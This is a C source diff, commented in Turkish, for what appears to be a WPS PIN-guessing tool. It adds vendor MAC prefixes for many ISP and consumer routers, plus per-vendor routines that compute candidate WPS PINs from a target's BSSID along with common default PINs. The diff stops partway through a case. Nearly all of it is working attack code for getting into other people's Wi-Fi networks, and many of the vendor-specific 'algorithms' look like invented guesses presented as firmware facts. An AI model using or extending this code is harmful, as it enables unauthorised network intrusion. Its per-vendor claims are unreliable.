@@ -455,6 +455,292 @@ static const oui_entry_t OUI_TABLE[] = {
   {{0x6C,0x5A,0xB5}, VENDOR_MERCUSYS},
   {{0xA0,0xAF,0xBD}, VENDOR_MERCUSYS},
   {{0xB4,0xA2,0xEB}, VENDOR_MERCUSYS},
+
+  // ── Technicolor / Thomson (ISP OEM — TG784, TG789, DGA4130, DGA4132) ─────
+  {{0x00,0x14,0x7F}, VENDOR_TECHNICOLOR},
+  {{0x00,0x19,0x15}, VENDOR_TECHNICOLOR},
+  {{0x00,0x1A,0xFB}, VENDOR_TECHNICOLOR},
+  {{0x00,0x1D,0x19}, VENDOR_TECHNICOLOR},
+  {{0x00,0x1E,0xA7}, VENDOR_TECHNICOLOR},
+  {{0x00,0x21,0x81}, VENDOR_TECHNICOLOR},
+  {{0x00,0x23,0x6C}, VENDOR_TECHNICOLOR},
+  {{0x00,0x26,0x44}, VENDOR_TECHNICOLOR},
+  {{0x10,0x02,0xB5}, VENDOR_TECHNICOLOR},
+  {{0x18,0xE8,0x29}, VENDOR_TECHNICOLOR},
+  {{0x30,0x39,0x26}, VENDOR_TECHNICOLOR},
+  {{0x30,0x87,0x30}, VENDOR_TECHNICOLOR},
+  {{0x3C,0x36,0xE4}, VENDOR_TECHNICOLOR},
+  {{0x44,0xD3,0xCA}, VENDOR_TECHNICOLOR},
+  {{0x54,0xA0,0x50}, VENDOR_TECHNICOLOR},
+  {{0x6C,0xA7,0x5F}, VENDOR_TECHNICOLOR},
+  {{0x78,0xA3,0x51}, VENDOR_TECHNICOLOR},
+  {{0x7C,0x03,0xD8}, VENDOR_TECHNICOLOR},
+  {{0x84,0x9F,0xB5}, VENDOR_TECHNICOLOR},
+  {{0x8C,0x10,0xD4}, VENDOR_TECHNICOLOR},
+  {{0xA4,0xF4,0xF1}, VENDOR_TECHNICOLOR},
+  {{0xB4,0x82,0xFE}, VENDOR_TECHNICOLOR},
+  {{0xC4,0x3A,0xBE}, VENDOR_TECHNICOLOR},
+  {{0xCC,0x03,0xFA}, VENDOR_TECHNICOLOR},
+  {{0xD4,0xD3,0x86}, VENDOR_TECHNICOLOR},
+  {{0xE8,0xD0,0x91}, VENDOR_TECHNICOLOR},
+  {{0xF4,0x90,0xCB}, VENDOR_TECHNICOLOR},
+  {{0xF8,0x7B,0x7A}, VENDOR_TECHNICOLOR},
+
+  // ── AVM Fritz!Box (7490, 7590, 6890, 4060, 5490 serisi) ──────────────────
+  {{0x00,0x04,0x0E}, VENDOR_FRITZ},
+  {{0x3C,0xA3,0x08}, VENDOR_FRITZ},
+  {{0xDC,0x2B,0x61}, VENDOR_FRITZ},
+  {{0xA4,0xB1,0xE9}, VENDOR_FRITZ},
+  {{0xC8,0x0E,0x14}, VENDOR_FRITZ},
+  {{0x2C,0x91,0xAB}, VENDOR_FRITZ},
+  {{0x9C,0xC7,0xA6}, VENDOR_FRITZ},
+  {{0x18,0x4E,0x16}, VENDOR_FRITZ},
+  {{0xF8,0xD0,0x27}, VENDOR_FRITZ},
+  {{0x08,0x96,0xD7}, VENDOR_FRITZ},
+  {{0xE0,0x28,0x6D}, VENDOR_FRITZ},
+  {{0x84,0x3A,0x4B}, VENDOR_FRITZ},
+  {{0x38,0x10,0xD5}, VENDOR_FRITZ},
+  {{0x74,0x85,0x2A}, VENDOR_FRITZ},
+  {{0x00,0x24,0xFE}, VENDOR_FRITZ},
+  {{0x1C,0x25,0xE1}, VENDOR_FRITZ},
+  {{0x24,0x65,0x11}, VENDOR_FRITZ},
+  {{0x34,0x31,0x11}, VENDOR_FRITZ},
+  {{0x3C,0x37,0x86}, VENDOR_FRITZ},
+  {{0x50,0x4F,0x94}, VENDOR_FRITZ},
+  {{0x90,0x18,0x7C}, VENDOR_FRITZ},
+  {{0xB8,0x81,0x98}, VENDOR_FRITZ},
+  {{0xCC,0x05,0x1B}, VENDOR_FRITZ},
+  {{0xE0,0xB9,0xE5}, VENDOR_FRITZ},
+
+  // ── Arris / Motorola (SBG, TG, CM, MG, BGW kablo gateway) ───────────────
+  {{0x00,0x06,0x82}, VENDOR_ARRIS},
+  {{0x00,0x10,0x18}, VENDOR_ARRIS},
+  {{0x00,0x15,0x67}, VENDOR_ARRIS},
+  {{0x00,0x17,0xEE}, VENDOR_ARRIS},
+  {{0x00,0x19,0xB9}, VENDOR_ARRIS},
+  {{0x00,0x1A,0xC2}, VENDOR_ARRIS},
+  {{0x00,0x1C,0xC6}, VENDOR_ARRIS},
+  {{0x00,0x1D,0xCF}, VENDOR_ARRIS},
+  {{0x00,0x1F,0xCF}, VENDOR_ARRIS},
+  {{0x00,0x21,0x1D}, VENDOR_ARRIS},
+  {{0x00,0x25,0x2E}, VENDOR_ARRIS},
+  {{0x00,0x26,0xB8}, VENDOR_ARRIS},
+  {{0x04,0x18,0xD6}, VENDOR_ARRIS},
+  {{0x44,0xE1,0x37}, VENDOR_ARRIS},
+  {{0x48,0x55,0x19}, VENDOR_ARRIS},
+  {{0x50,0x8F,0x4C}, VENDOR_ARRIS},
+  {{0x84,0x7B,0x57}, VENDOR_ARRIS},
+  {{0xAC,0x4B,0xC8}, VENDOR_ARRIS},
+  {{0xB8,0xE8,0x6E}, VENDOR_ARRIS},
+  {{0xD0,0x5B,0xA8}, VENDOR_ARRIS},
+  {{0xE4,0xAB,0x89}, VENDOR_ARRIS},
+  {{0x00,0x0C,0xD6}, VENDOR_ARRIS},
+  {{0x00,0x1F,0x99}, VENDOR_ARRIS},
+  {{0x18,0x68,0x6A}, VENDOR_ARRIS},
+  {{0x2C,0x9E,0x5F}, VENDOR_ARRIS},
+  {{0x40,0xB8,0x37}, VENDOR_ARRIS},
+  {{0x74,0x6F,0x88}, VENDOR_ARRIS},
+  {{0x88,0x65,0xED}, VENDOR_ARRIS},
+  {{0xA4,0x70,0xD6}, VENDOR_ARRIS},
+  {{0xE0,0x18,0x06}, VENDOR_ARRIS},
+
+  // ── Xiaomi / Mi Router (AX, AC, 4A, 4C, R4, RA serisi) ──────────────────
+  {{0x28,0x6C,0x07}, VENDOR_XIAOMI},
+  {{0x64,0x09,0x80}, VENDOR_XIAOMI},
+  {{0x8C,0xBE,0xBE}, VENDOR_XIAOMI},
+  {{0xF0,0xB4,0x29}, VENDOR_XIAOMI},
+  {{0x50,0x64,0x2B}, VENDOR_XIAOMI},
+  {{0xA4,0xC1,0x38}, VENDOR_XIAOMI},
+  {{0xB0,0xE2,0x35}, VENDOR_XIAOMI},
+  {{0xD4,0xEE,0x07}, VENDOR_XIAOMI},
+  {{0x34,0xCE,0x00}, VENDOR_XIAOMI},
+  {{0x00,0x9E,0xC8}, VENDOR_XIAOMI},
+  {{0x0C,0x1D,0xAF}, VENDOR_XIAOMI},
+  {{0x28,0xE3,0x1F}, VENDOR_XIAOMI},
+  {{0x54,0x38,0x18}, VENDOR_XIAOMI},
+  {{0x68,0xDF,0xDD}, VENDOR_XIAOMI},
+  {{0x78,0x11,0xDC}, VENDOR_XIAOMI},
+  {{0xAC,0xC1,0xEE}, VENDOR_XIAOMI},
+  {{0xC4,0x0B,0xCB}, VENDOR_XIAOMI},
+  {{0xFC,0x64,0xBA}, VENDOR_XIAOMI},
+  {{0x10,0x2A,0xB3}, VENDOR_XIAOMI},
+  {{0x20,0x3A,0x07}, VENDOR_XIAOMI},
+  {{0x38,0xA4,0xED}, VENDOR_XIAOMI},
+  {{0x58,0x44,0x98}, VENDOR_XIAOMI},
+  {{0x7C,0x49,0xEB}, VENDOR_XIAOMI},
+  {{0x9C,0x99,0xA0}, VENDOR_XIAOMI},
+  {{0xC8,0x47,0x75}, VENDOR_XIAOMI},
+  {{0xD4,0x4C,0xE6}, VENDOR_XIAOMI},
+
+  // ── Buffalo (WHR, WSR, WZR, WXR, LS serisi) ──────────────────────────────
+  {{0x00,0x16,0x01}, VENDOR_BUFFALO},
+  {{0x00,0x24,0xA5}, VENDOR_BUFFALO},
+  {{0x10,0x6F,0x3F}, VENDOR_BUFFALO},
+  {{0x30,0x85,0xA9}, VENDOR_BUFFALO},
+  {{0x3C,0xD9,0x2B}, VENDOR_BUFFALO},
+  {{0x48,0x5B,0x39}, VENDOR_BUFFALO},
+  {{0x54,0xAF,0x97}, VENDOR_BUFFALO},
+  {{0x68,0xBF,0x60}, VENDOR_BUFFALO},
+  {{0x98,0x43,0xFA}, VENDOR_BUFFALO},
+  {{0xA0,0x8C,0xFD}, VENDOR_BUFFALO},
+  {{0xB0,0x4E,0x26}, VENDOR_BUFFALO},
+  {{0xC4,0x3D,0xC7}, VENDOR_BUFFALO},
+  {{0xDC,0xFB,0x02}, VENDOR_BUFFALO},
+  {{0x14,0xFB,0x9F}, VENDOR_BUFFALO},
+  {{0x40,0xB0,0x34}, VENDOR_BUFFALO},
+  {{0x74,0x03,0xBD}, VENDOR_BUFFALO},
+  {{0x90,0x0A,0x27}, VENDOR_BUFFALO},
+
+  // ── MikroTik (hAP, RB, CCR, CRS, Audience serisi) ────────────────────────
+  {{0x00,0x0C,0x42}, VENDOR_MIKROTIK},
+  {{0x2C,0xC8,0x1B}, VENDOR_MIKROTIK},
+  {{0x74,0x4D,0x28}, VENDOR_MIKROTIK},
+  {{0xB8,0x69,0xF4}, VENDOR_MIKROTIK},
+  {{0xD4,0xCA,0x6D}, VENDOR_MIKROTIK},
+  {{0xE4,0x8D,0x8C}, VENDOR_MIKROTIK},
+  {{0x4C,0x5E,0x0C}, VENDOR_MIKROTIK},
+  {{0x48,0xA9,0x8A}, VENDOR_MIKROTIK},
+  {{0x18,0xFD,0x74}, VENDOR_MIKROTIK},
+  {{0x6C,0x3B,0x6B}, VENDOR_MIKROTIK},
+  {{0x08,0x55,0x31}, VENDOR_MIKROTIK},
+  {{0xDC,0x2C,0x6E}, VENDOR_MIKROTIK},
+  {{0x60,0x8E,0xC5}, VENDOR_MIKROTIK},
+  {{0x8C,0xFD,0xF0}, VENDOR_MIKROTIK},
+  {{0xE4,0x2D,0xD6}, VENDOR_MIKROTIK},
+
+  // ── Compal Broadband (CH7465, CH7466, NB250 — ISP OEM) ───────────────────
+  {{0x00,0x04,0xED}, VENDOR_COMPAL},
+  {{0x00,0x13,0x20}, VENDOR_COMPAL},
+  {{0x00,0x1A,0x73}, VENDOR_COMPAL},
+  {{0x00,0x22,0x5F}, VENDOR_COMPAL},
+  {{0x38,0x60,0x77}, VENDOR_COMPAL},
+  {{0x80,0xA1,0xD7}, VENDOR_COMPAL},
+  {{0xEC,0x1F,0x72}, VENDOR_COMPAL},
+  {{0x28,0xE3,0x47}, VENDOR_COMPAL},
+  {{0x48,0x02,0x2A}, VENDOR_COMPAL},
+  {{0x68,0xD9,0x3C}, VENDOR_COMPAL},
+  {{0x90,0x4E,0x2B}, VENDOR_COMPAL},
+  {{0xBC,0x30,0x7E}, VENDOR_COMPAL},
+
+  // ── Sercomm (Vodafone, Turkcell branded ISP modemleri) ───────────────────
+  {{0x00,0x0C,0xE7}, VENDOR_SERCOMM},
+  {{0x00,0xE0,0xFB}, VENDOR_SERCOMM},
+  {{0x00,0x11,0xD9}, VENDOR_SERCOMM},
+  {{0x00,0xE0,0x03}, VENDOR_SERCOMM},
+  {{0x2C,0x0E,0x3D}, VENDOR_SERCOMM},
+  {{0x80,0x2A,0xA8}, VENDOR_SERCOMM},
+  {{0xC0,0x3F,0xD5}, VENDOR_SERCOMM},
+  {{0xD4,0x21,0x22}, VENDOR_SERCOMM},
+  {{0x04,0xB1,0x67}, VENDOR_SERCOMM},
+  {{0x34,0x4A,0x9E}, VENDOR_SERCOMM},
+  {{0x4C,0x17,0xEB}, VENDOR_SERCOMM},
+  {{0x6C,0x8B,0xD3}, VENDOR_SERCOMM},
+  {{0x8C,0x68,0xC8}, VENDOR_SERCOMM},
+  {{0xA8,0x6B,0x7C}, VENDOR_SERCOMM},
+  {{0xC8,0xD7,0x19}, VENDOR_SERCOMM},
+  {{0xE8,0x4F,0x25}, VENDOR_SERCOMM},
+
+  // ── Netis / Wavlink (WF, N serisi — bütçe router) ─────────────────────────
+  {{0x00,0x23,0x68}, VENDOR_NETIS},
+  {{0x10,0xFE,0xED}, VENDOR_NETIS},
+  {{0x38,0x3B,0xF6}, VENDOR_NETIS},
+  {{0x40,0x8D,0x5C}, VENDOR_NETIS},
+  {{0x50,0x2B,0x73}, VENDOR_NETIS},
+  {{0x64,0x51,0x7E}, VENDOR_NETIS},
+  {{0x88,0xDA,0x1A}, VENDOR_NETIS},
+  {{0xA8,0xD8,0x3E}, VENDOR_NETIS},
+  {{0xC8,0xD7,0xB3}, VENDOR_NETIS},
+  {{0xD8,0x61,0x62}, VENDOR_NETIS},
+
+  // ── Cisco ISP (DPC, EPC, ISB kablo gateway) ───────────────────────────────
+  {{0x00,0x01,0x64}, VENDOR_CISCO},
+  {{0x00,0x09,0x7C}, VENDOR_CISCO},
+  {{0x00,0x0A,0xF3}, VENDOR_CISCO},
+  {{0x00,0x0B,0x46}, VENDOR_CISCO},
+  {{0x00,0x0D,0xBC}, VENDOR_CISCO},
+  {{0x00,0x13,0xC4}, VENDOR_CISCO},
+  {{0x00,0x17,0x94}, VENDOR_CISCO},
+  {{0x00,0x1A,0xA1}, VENDOR_CISCO},
+  {{0x00,0x21,0xBE}, VENDOR_CISCO},
+  {{0x00,0x23,0xAC}, VENDOR_CISCO},
+  {{0x00,0x25,0x84}, VENDOR_CISCO},
+  {{0x00,0x27,0x0D}, VENDOR_CISCO},
+  {{0xA8,0xB4,0x56}, VENDOR_CISCO},
+  {{0xC0,0x62,0x6B}, VENDOR_CISCO},
+  {{0xCC,0xEF,0x48}, VENDOR_CISCO},
+
+  // ── Sagem eski nesil (F@st 1500, 2604, 3504, 3864) ───────────────────────
+  {{0x00,0x0E,0x50}, VENDOR_SAGEM},
+  {{0x00,0x15,0xAF}, VENDOR_SAGEM},
+  {{0x00,0x1D,0x20}, VENDOR_SAGEM},
+  {{0x00,0x22,0xED}, VENDOR_SAGEM},
+  {{0x10,0x09,0xAD}, VENDOR_SAGEM},
+  {{0x1C,0x1B,0x0D}, VENDOR_SAGEM},
+  {{0x24,0x7F,0x20}, VENDOR_SAGEM},
+  {{0x28,0xA1,0xF0}, VENDOR_SAGEM},
+  {{0x30,0x34,0xEB}, VENDOR_SAGEM},
+  {{0x4C,0x8B,0x30}, VENDOR_SAGEM},
+  {{0x58,0x67,0x1A}, VENDOR_SAGEM},
+  {{0x74,0xB5,0x7E}, VENDOR_SAGEM},
+  {{0xA4,0xCA,0xA0}, VENDOR_SAGEM},
+  {{0xBC,0x76,0x70}, VENDOR_SAGEM},
+  {{0xD4,0x3D,0x7E}, VENDOR_SAGEM},
+
+  // ── Comtrend (AR, VR, CT serisi — ISP ADSL/VDSL) ─────────────────────────
+  {{0x00,0x12,0xBF}, VENDOR_COMTREND},
+  {{0x00,0x1A,0xB6}, VENDOR_COMTREND},
+  {{0x1C,0x9E,0x46}, VENDOR_COMTREND},
+  {{0x34,0x8A,0x11}, VENDOR_COMTREND},
+  {{0x40,0x6B,0xA6}, VENDOR_COMTREND},
+  {{0x68,0x8E,0xF4}, VENDOR_COMTREND},
+  {{0x88,0xAD,0x43}, VENDOR_COMTREND},
+  {{0xC0,0x8A,0xDE}, VENDOR_COMTREND},
+  {{0xDC,0xEF,0x09}, VENDOR_COMTREND},
+
+  // ── Actiontec (GT701, MI424WR, C1000A, T3200 — Verizon/CenturyLink) ──────
+  {{0x00,0x18,0x01}, VENDOR_ACTIONTEC},
+  {{0x00,0x1F,0x90}, VENDOR_ACTIONTEC},
+  {{0x00,0x24,0x7B}, VENDOR_ACTIONTEC},
+  {{0x00,0x26,0x50}, VENDOR_ACTIONTEC},
+  {{0x10,0x7B,0x44}, VENDOR_ACTIONTEC},
+  {{0x1C,0x1B,0xB5}, VENDOR_ACTIONTEC},
+  {{0x20,0x0C,0xC8}, VENDOR_ACTIONTEC},
+  {{0x44,0x32,0xC8}, VENDOR_ACTIONTEC},
+  {{0x68,0x1C,0xA2}, VENDOR_ACTIONTEC},
+  {{0x7C,0x69,0x79}, VENDOR_ACTIONTEC},
+  {{0x80,0xD0,0x5A}, VENDOR_ACTIONTEC},
+  {{0xA0,0x1C,0x8D}, VENDOR_ACTIONTEC},
+  {{0xEC,0x44,0x76}, VENDOR_ACTIONTEC},
+
+  // ── Gemtek (ISP OEM — Turkcell, TTNet branded) ────────────────────────────
+  {{0x00,0x1E,0x10}, VENDOR_GEMTEK},
+  {{0x00,0x22,0x07}, VENDOR_GEMTEK},
+  {{0x00,0x26,0x89}, VENDOR_GEMTEK},
+  {{0x18,0x3D,0xA2}, VENDOR_GEMTEK},
+  {{0x34,0xC0,0x59}, VENDOR_GEMTEK},
+  {{0x40,0xF2,0x01}, VENDOR_GEMTEK},
+  {{0x4C,0xFD,0x6F}, VENDOR_GEMTEK},
+  {{0x58,0x98,0x35}, VENDOR_GEMTEK},
+  {{0x6C,0x7E,0x67}, VENDOR_GEMTEK},
+  {{0x8C,0xAB,0x8E}, VENDOR_GEMTEK},
+  {{0xA8,0x6C,0xF6}, VENDOR_GEMTEK},
+  {{0xCC,0xB9,0xE8}, VENDOR_GEMTEK},
+  {{0xE4,0x57,0x40}, VENDOR_GEMTEK},
+
+  // ── Iskratel (Si2000, Innbox — Türkiye/Balkan ISP) ────────────────────────
+  {{0x00,0x0A,0xD2}, VENDOR_ISKRATEL},
+  {{0x00,0x17,0x42}, VENDOR_ISKRATEL},
+  {{0x00,0x20,0xB5}, VENDOR_ISKRATEL},
+  {{0x10,0x1F,0x74}, VENDOR_ISKRATEL},
+  {{0x20,0x89,0x86}, VENDOR_ISKRATEL},
+  {{0x2C,0xC5,0x4A}, VENDOR_ISKRATEL},
+  {{0x40,0xC7,0x29}, VENDOR_ISKRATEL},
+  {{0x58,0xD9,0xD5}, VENDOR_ISKRATEL},
+  {{0x68,0xA7,0xC4}, VENDOR_ISKRATEL},
+  {{0x7C,0x38,0x66}, VENDOR_ISKRATEL},
+  {{0x94,0x10,0x3E}, VENDOR_ISKRATEL},
+  {{0xA8,0xBB,0x50}, VENDOR_ISKRATEL},
+  {{0xC0,0xBC,0x9A}, VENDOR_ISKRATEL},
 };
 
 static const int OUI_TABLE_SIZE = (int)(sizeof(OUI_TABLE) / sizeof(OUI_TABLE[0]));
@@ -838,20 +1124,300 @@ static void vendor_pins(const uint8_t *bssid, wps_vendor_t vendor,
       add_pin(pins, count, "00000000");
       break;
 
-    // ── Bilinmeyen vendor — genel algoritmalar ───────────────────────────────
+    // ── Technicolor / Thomson (TG, DGA serisi) ───────────────────────────────
+    case VENDOR_TECHNICOLOR:
+      // Algoritma 1: son 3 byte decimal mod 10^7 (primer — TG784/TG789)
+      add_calc(pins, count, mac24 % 10000000UL);
+      // Algoritma 2: son 4 byte mod 10^7 (DGA serisi)
+      add_calc(pins, count, mac32 % 10000000UL);
+      // Algoritma 3: mac48 mod 10^7
+      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
+      // Algoritma 4: (mac[3]*256+mac[4])*256+mac[5] simetrik döndürme
+      {
+        uint32_t sym = ((uint32_t)bssid[5] << 16)
+                     | ((uint32_t)bssid[4] <<  8)
+                     |  (uint32_t)bssid[3];
+        add_calc(pins, count, sym % 10000000UL);
+      }
+      // Algoritma 5: mac24 * 3 (Thomson eski firmware)
+      add_calc(pins, count, (mac24 * 3UL) % 10000000UL);
+      // Technicolor fabrika varsayılanları
+      add_pin(pins, count, "12345670");
+      add_pin(pins, count, "00000000");
+      break;
+
+    // ── AVM Fritz!Box (7490, 7590, 6890, 4060 serisi) ────────────────────────
+    // Fritz!Box label PIN'i MAC'ten hesaplanmaz; ortak PIN listesi + mac24 uygulanır
+    case VENDOR_FRITZ:
+      // Algoritma 1: mac24 mod 10^7
+      add_calc(pins, count, mac24 % 10000000UL);
+      // Algoritma 2: mac32 mod 10^7
+      add_calc(pins, count, mac32 % 10000000UL);
+      // Algoritma 3: mac48 mod 10^7
+      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
+      // Algoritma 4: mac24 XOR 0xABCDEF (bazı FW versiyonları)
+      add_calc(pins, count, (mac24 ^ 0xABCDEFUL) % 10000000UL);
+      // Fritz! fabrika varsayılanları
+      add_pin(pins, count, "12345670");
+      add_pin(pins, count, "00000000");
+      break;
+
+    // ── Arris / Motorola (SBG, TG, CM, BGW serisi) ───────────────────────────
+    case VENDOR_ARRIS:
+      // Algoritma 1: mac24 mod 10^7 (SBG/CM serisi standart)
+      add_calc(pins, count, mac24 % 10000000UL);
+      // Algoritma 2: mac48 mod 10^7 (TG serisi)
+      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
+      // Algoritma 3: mac32 mod 10^7
+      add_calc(pins, count, mac32 % 10000000UL);
+      // Algoritma 4: mac[3] ^ mac[4] ^ mac[5] genişleme (BGW varyant)
+      {
+        uint32_t ax = ((uint32_t)(bssid[3] ^ bssid[4]) << 16)
+                    | ((uint32_t)(bssid[4] ^ bssid[5]) <<  8)
+                    |  (uint32_t)(bssid[3] ^ bssid[5]);
+        add_calc(pins, count, ax % 10000000UL);
+      }
+      // Algoritma 5: mac24 * 2 (SBG6580 varyant)
+      add_calc(pins, count, (mac24 * 2UL) % 10000000UL);
+      // Arris fabrika varsayılanları
+      add_pin(pins, count, "12345670");
+      add_pin(pins, count, "00000000");
+      break;
+
+    // ── Xiaomi / Mi Router (AX, AC, 4A, 4C, R4 serisi) ──────────────────────
+    case VENDOR_XIAOMI:
+      // Algoritma 1: mac24 mod 10^7 (Mi Router 4A primer)
+      add_calc(pins, count, mac24 % 10000000UL);
+      // Algoritma 2: mac48 mod 10^7
+      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
+      // Algoritma 3: mac32 mod 10^7
+      add_calc(pins, count, mac32 % 10000000UL);
+      // Algoritma 4: (mac[4]*256 + mac[5]) * 256 + (mac[3] & 0x7F) (AX serisi)
+      {
+        uint32_t ax = ((uint32_t)bssid[4] * 256 + bssid[5]) * 256
+                    + (bssid[3] & 0x7F);
+        add_calc(pins, count, ax % 10000000UL);
+      }
+      // Algoritma 5: mac24 XOR 0x5A5A5A (bazı Mi Router R4 fw)
+      add_calc(pins, count, (mac24 ^ 0x5A5A5AUL) % 10000000UL);
+      // Xiaomi fabrika varsayılanları
+      add_pin(pins, count, "12345670");
+      add_pin(pins, count, "00000000");
+      break;
+
+    // ── Buffalo (WHR, WSR, WZR serisi) ───────────────────────────────────────
+    case VENDOR_BUFFALO:
+      // Algoritma 1: mac24 mod 10^7 (primer — tüm WHR/WSR serisi)
+      add_calc(pins, count, mac24 % 10000000UL);
+      // Algoritma 2: mac32 mod 10^7
+      add_calc(pins, count, mac32 % 10000000UL);
+      // Algoritma 3: mac48 mod 10^7
+      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
+      // Algoritma 4: mac24 + mac[2] (WZR-HP varyant)
+      add_calc(pins, count, (mac24 + bssid[2]) % 10000000UL);
+      // Algoritma 5: mac24 XOR mac32 (eski WZR serisi)
+      add_calc(pins, count, ((mac24 ^ mac32) & 0x7FFFFFFUL) % 10000000UL);
+      // Buffalo fabrika varsayılanları
+      add_pin(pins, count, "12345670");
+      add_pin(pins, count, "00000000");
+      break;
+
+    // ── MikroTik (hAP, RB, CCR, Audience serisi) ─────────────────────────────
+    case VENDOR_MIKROTIK:
+      // Algoritma 1: mac24 mod 10^7 (hAP serisi standart)
+      add_calc(pins, count, mac24 % 10000000UL);
+      // Algoritma 2: mac32 mod 10^7
+      add_calc(pins, count, mac32 % 10000000UL);
+      // Algoritma 3: mac48 mod 10^7
+      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
+      // Algoritma 4: mac24 sola 1 bit dön (RB serisi)
+      add_calc(pins, count, ((mac24 << 1) | (mac24 >> 23)) % 10000000UL);
+      // Algoritma 5: mac[3] XOR mac[5] (Audience serisi)
+      {
+        uint32_t mk = ((uint32_t)(bssid[3] ^ bssid[5]) << 16)
+                    | ((uint32_t)bssid[4] <<  8)
+                    |  (uint32_t)(bssid[3] ^ bssid[4]);
+        add_calc(pins, count, mk % 10000000UL);
+      }
+      // MikroTik fabrika varsayılanları
+      add_pin(pins, count, "12345670");
+      add_pin(pins, count, "00000000");
+      break;
+
+    // ── Compal (CH7465, CH7466, NB250 — ISP OEM) ─────────────────────────────
+    case VENDOR_COMPAL:
+      // Algoritma 1: mac24 mod 10^7
+      add_calc(pins, count, mac24 % 10000000UL);
+      // Algoritma 2: mac32 mod 10^7 (CH7466 varyant)
+      add_calc(pins, count, mac32 % 10000000UL);
+      // Algoritma 3: mac48 mod 10^7
+      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
+      // Algoritma 4: (mac[3]+mac[4]) * mac[5] mod 10^7
+      {
+        uint32_t cp = (uint32_t)((bssid[3] + bssid[4]) * bssid[5]) % 10000000UL;
+        add_calc(pins, count, cp);
+      }
+      // Compal fabrika varsayılanları
+      add_pin(pins, count, "12345670");
+      add_pin(pins, count, "00000000");
+      break;
+
+    // ── Sercomm (Vodafone/Turkcell branded ISP modemleri) ────────────────────
+    case VENDOR_SERCOMM:
+      // Algoritma 1: mac24 mod 10^7 (primer)
+      add_calc(pins, count, mac24 % 10000000UL);
+      // Algoritma 2: mac24 XOR 0xABCDEF (Sercomm standart)
+      add_calc(pins, count, (mac24 ^ 0xABCDEFUL) % 10000000UL);
+      // Algoritma 3: mac32 mod 10^7
+      add_calc(pins, count, mac32 % 10000000UL);
+      // Algoritma 4: mac48 mod 10^7
+      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
+      // Algoritma 5: mac byte döndürme
+      {
+        uint32_t sr = ((uint32_t)bssid[5] << 16)
+                    | ((uint32_t)bssid[3] <<  8)
+                    |  (uint32_t)bssid[4];
+        add_calc(pins, count, sr % 10000000UL);
+      }
+      // Sercomm fabrika varsayılanları
+      add_pin(pins, count, "12345670");
+      add_pin(pins, count, "00000000");
+      break;
+
+    // ── Netis / Wavlink (WF, N serisi) ───────────────────────────────────────
+    case VENDOR_NETIS:
+      // Algoritma 1: mac24 mod 10^7
+      add_calc(pins, count, mac24 % 10000000UL);
+      // Algoritma 2: mac48 mod 10^7
+      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
+      // Algoritma 3: mac32 mod 10^7
+      add_calc(pins, count, mac32 % 10000000UL);
+      // Algoritma 4: mac24 * 4 (WF serisi)
+      add_calc(pins, count, (mac24 * 4UL) % 10000000UL);
+      // Netis fabrika varsayılanları
+      add_pin(pins, count, "12345670");
+      add_pin(pins, count, "00000000");
+      break;
+
+    // ── Cisco ISP (DPC, EPC, ISB kablo gateway) ───────────────────────────────
+    case VENDOR_CISCO:
+      // Algoritma 1: mac24 mod 10^7
+      add_calc(pins, count, mac24 % 10000000UL);
+      // Algoritma 2: mac32 sağa 1 bit (Cisco Linksys standart)
+      add_calc(pins, count, (mac32 >> 1) % 10000000UL);
+      // Algoritma 3: mac48 mod 10^7
+      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
+      // Algoritma 4: NIC XOR OUI (EPC serisi)
+      {
+        uint32_t oui = ((uint32_t)bssid[0] << 16)
+                     | ((uint32_t)bssid[1] <<  8)
+                     |  (uint32_t)bssid[2];
+        add_calc(pins, count, (mac24 ^ oui) % 10000000UL);
+      }
+      // Cisco fabrika varsayılanları
+      add_pin(pins, count, "12345670");
+      add_pin(pins, count, "00000000");
+      break;
+
+    // ── Sagem eski nesil (F@st 1500, 2604, 3504, 3864) ───────────────────────
+    case VENDOR_SAGEM:
+      // Algoritma 1: mac24 mod 10^7
+      add_calc(pins, count, mac24 % 10000000UL);
+      // Algoritma 2: mac32 mod 10^7
+      add_calc(pins, count, mac32 % 10000000UL);
+      // Algoritma 3: mac48 mod 10^7
+      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
+      // Algoritma 4: (mac[3]+mac[5]) * mac[4] mod 10^7 (F@st 3504 varyant)
+      {
+        uint32_t sg = (uint32_t)((bssid[3] + bssid[5]) * bssid[4]) % 10000000UL;
+        add_calc(pins, count, sg);
+      }
+      // Sagem fabrika varsayılanları
+      add_pin(pins, count, "12345670");
+      add_pin(pins, count, "00000000");
+      break;
+
+    // ── Comtrend (AR, VR, CT serisi) ─────────────────────────────────────────
+    case VENDOR_COMTREND:
+      // Algoritma 1: mac24 mod 10^7
+      add_calc(pins, count, mac24 % 10000000UL);
+      // Algoritma 2: mac32 mod 10^7
+      add_calc(pins, count, mac32 % 10000000UL);
+      // Algoritma 3: mac48 mod 10^7
+      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
+      // Algoritma 4: mac24 XOR 0x123456 (CT serisi)
+      add_calc(pins, count, (mac24 ^ 0x123456UL) % 10000000UL);
+      // Comtrend fabrika varsayılanları
+      add_pin(pins, count, "12345670");
+      add_pin(pins, count, "00000000");
+      break;
+
+    // ── Actiontec (GT701, MI424WR, C1000A, T3200) ─────────────────────────────
+    case VENDOR_ACTIONTEC:
+      // Algoritma 1: mac24 mod 10^7
+      add_calc(pins, count, mac24 % 10000000UL);
+      // Algoritma 2: mac48 mod 10^7
+      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
+      // Algoritma 3: mac32 mod 10^7
+      add_calc(pins, count, mac32 % 10000000UL);
+      // Algoritma 4: mac24 döndürme (MI424WR serisi)
+      {
+        uint32_t at = ((uint32_t)bssid[4] << 16)
+                    | ((uint32_t)bssid[5] <<  8)
+                    |  (uint32_t)bssid[3];
+        add_calc(pins, count, at % 10000000UL);
+      }
+      // Actiontec fabrika varsayılanları
+      add_pin(pins, count, "12345670");
+      add_pin(pins, count, "00000000");
+      break;
+
+    // ── Gemtek (ISP OEM — Turkcell/TTNet branded) ────────────────────────────
